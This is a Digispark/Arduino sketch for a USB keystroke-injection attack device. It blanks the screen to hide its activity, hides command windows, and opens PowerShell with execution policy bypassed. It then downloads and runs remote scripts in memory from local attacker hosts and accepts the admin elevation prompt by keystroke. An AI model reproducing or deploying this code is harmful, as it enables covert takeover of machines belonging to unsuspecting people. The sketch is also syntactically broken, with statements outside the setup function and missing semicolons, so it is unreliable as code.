#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.sendKeyStroke(0);
  
  //blank screen and start cmd
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(60);
  DigiKeyboard.println("cmd /c scrnsave.scr /s && rundll32 user32.dll");
  DigiKeyboard.delay(60);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(60);
  DigiKeyboard.println("CMD  /q /d /f:off /v:on /k MODE con: cols=18 lines=1");
  DigiKeyboard.delay(60);
  
  //start cmd window and hide offscreen
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(60);
  DigiKeyboard.println("CMD  /q /d /f:off /v:on /k MODE con: cols=20 lines=1");
  delay(600);
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_ALT_LEFT);
  delay(60);
  DigiKeyboard.print("m");
  DigiKeyboard.sendKeyPress(KEY_LEFT_ARROW);
  delay(1500);
  DigiKeyboard.sendKeyPress(0);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
  //open powershell window and hide in background
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(60);
  DigiKeyboard.println("powershell -ExecutionPolicy Bypass -WindowStyle hidden");
  DigiKeyboard.delay(60);
  
  //test command
  DigiKeyboard.println("notepad");
  delay(600);
  DigiKeyboard.println("hello world");
  delay(60);
  
  //powershell donwload and run
  DigiKeyboard.println("Invoke-WebRequest -Uri '<url of payload>' -OutFile autoruns.exe; .\autoruns.exe")
  //powershell download and run in memory
  DigiKeyboard.println("(New-Object System.Net.WebClient).DownloadString('<url of payload>') | IEX")\
  //(new-object system.net.webclient).downloadString('http://192.168.0.10/kid_dll.ps1') | IEX
  
  //deliver payload
  DigiKeyboard.println("powershell.exe -nop -w hidden -c $c=new-object net.webclient;$c.proxy=[Net.WebRequest]::GetSystemWebProxy();$c.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $c.downloadstring('http://192.168.1.10:8080/exploit');");
  
  //turn off blank screen after everything is done
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(60);
  DigiKeyboard.println("taskkill /im scrnsave.scr /f");
  }
  //powershell with admin access and payload delivery
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.println("powershell -ExecutionPolicy Bypass -WindowStyle hidden"); 
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("Start-Process -ExecutionPolicy Bypass -WindowStyle hidden -WindowStyle powershell -Verb runAs");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("(New-Object System.Net.WebClient).DownloadString('http://192.168.0.10/1.ps1') | IEX");
  DigiKeyboard.delay(1000);

}

void loop() {

}
